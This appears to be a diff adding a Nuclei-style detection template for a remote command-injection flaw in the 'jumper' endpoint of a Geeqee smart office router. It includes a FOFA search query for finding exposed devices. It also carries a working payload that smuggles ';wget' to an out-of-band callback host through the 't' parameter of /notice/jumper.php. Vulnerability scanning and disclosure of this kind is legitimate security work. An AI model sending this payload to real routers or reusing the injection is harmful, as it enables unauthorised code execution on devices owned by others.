@@ -1,0 +1,27 @@
+id: Geeqee-Router-jumper-rce
+
+info:
+  name: 极企智能办公路由jumper接口存在RCE
+  author: god
+  severity: critical
+  description: 极企智能办公路由jumper接口存在RCE
+  metadata:
+    fofa-query: title="极企智能办公路由"
+  tags: geeqee,rce
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /notice/jumper.php?t=;wget%20http://{{interactsh-url}} HTTP/1.1
+    Host: {{Hostname}}
+    Connection: keep-alive
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol
